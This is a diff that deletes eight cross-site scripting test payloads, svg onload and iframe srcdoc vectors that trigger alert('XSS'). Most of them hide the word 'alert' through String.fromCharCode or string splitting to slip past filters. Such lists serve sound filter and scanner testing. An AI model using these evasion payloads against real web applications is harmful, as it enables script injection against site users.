@@ -1,8 +1,0 @@
-<iframe srcdoc="<svg onload='((window)[String.fromCharCode(97,108,101,114,116)]||console.log)(String.fromCharCode(88,83,83))'></svg>"></iframe>
-<svg onload="(function(){var a=String.fromCharCode(97,108,101,114,116);window[a]('XSS')})()">
-<svg onload="(function(){var a=String;var b=a.fromCharCode(97,108,101,114,116);window[b]('XSS')})()">
-<iframe srcdoc="<svg onload='(function(){var a=window;var b=a[String.fromCharCode(97,108,101,114,116)];b(String.fromCharCode(88,83,83))})()'></svg>"></iframe>
-<svg onload="(function(){var a=window,b='alert';a[b]('XSS')})()">
-<svg onload="(function(){var a=window,b=String.fromCharCode(97,108,101,114,116);a[b]('XSS')})()">
-<svg onload="(function(){var a=String,b=a.fromCharCode(97,108,101,114,116);window[b]('XSS')})()">
-<svg onload="(function(){var a=window,b='ale'+'rt';a[b]('XSS')})()">
